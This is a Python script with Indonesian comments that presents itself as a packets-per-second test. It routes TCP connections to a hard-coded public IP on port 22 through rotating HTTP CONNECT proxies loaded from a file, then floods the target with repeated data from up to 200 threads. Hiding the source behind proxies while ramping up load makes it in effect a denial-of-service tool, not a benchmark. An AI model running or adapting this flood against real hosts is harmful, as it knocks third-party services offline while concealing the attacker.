import socket
import threading
import time
import random

# Fungsi untuk memuat proxy dari file proxy.txt
def load_proxies():
    with open('proxy.txt', 'r') as file:
        proxies = [line.strip() for line in file.readlines()]
    return proxies

# Fungsi untuk mengirim paket TCP secara persisten ke server tertentu menggunakan proxy
def send_tcp_packets(ip, port, duration, proxy):
    timeout = time.time() + duration
    sent_packets = 0
    try:
        proxy_ip, proxy_port = proxy.split(':')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((proxy_ip, int(proxy_port)))

        # Membangun koneksi TCP melalui proxy (misalnya SOCKS5 atau HTTP CONNECT)
        # Anda mungkin perlu menambahkan logika khusus jika menggunakan SOCKS5 atau HTTP proxy.

        # Mengirim CONNECT request jika menggunakan HTTP proxy
        connect_request = f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n"
        sock.sendall(connect_request.encode())

        # Menerima respons dari proxy
        response = sock.recv(1024)

        # Cek apakah koneksi berhasil (misal dengan HTTP/1.1 200 Connection established)
        if b"200 Connection established" in response:
            while time.time() < timeout:
                try:
                    # Mengirim paket data melalui koneksi yang sudah terbuka
                    sock.sendall(b"Test Packet")
                    sent_packets += 1
                except Exception as e:
                    print(f"Error: {e}")
                    break
        else:
            print("Failed to establish connection through proxy")
    except Exception as e:
        print(f"Connection Error: {e}")
    finally:
        sock.close()
    return sent_packets

# Fungsi untuk mengukur PPS
def measure_tcp_pps(ip, port, duration=10, num_threads=1, proxies=[]):
    threads = []
    results = []

    def thread_function(ip, port, duration, proxy):
        result = send_tcp_packets(ip, port, duration, proxy)
        results.append(result)

    start_time = time.time()

    # Mulai beberapa thread untuk mengirim paket
    for _ in range(num_threads):
        proxy = random.choice(proxies) if proxies else None
        thread = threading.Thread(target=thread_function, args=(ip, port, duration, proxy))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    end_time = time.time()
    total_time = end_time - start_time
    total_packets = sum(results)
    pps = total_packets / total_time

    print(f"Total packets sent: {total_packets}")
    print(f"Total time: {total_time:.2f} seconds")
    print(f"Packets Per Second (PPS): {pps:.2f}")

# Contoh penggunaan
target_ip = "168.119.255.140"  # Ganti dengan IP target Anda
target_port = 22           # Ganti dengan port target Anda
test_duration = 30         # Waktu dalam detik

# Muat proxy dari file proxy.txt
proxies = load_proxies()

for num_threads in [10, 50, 100, 200]:
    print(f"Testing with {num_threads} threads...")
    measure_tcp_pps(target_ip, target_port, test_duration, num_threads, proxies)
    print("\n")
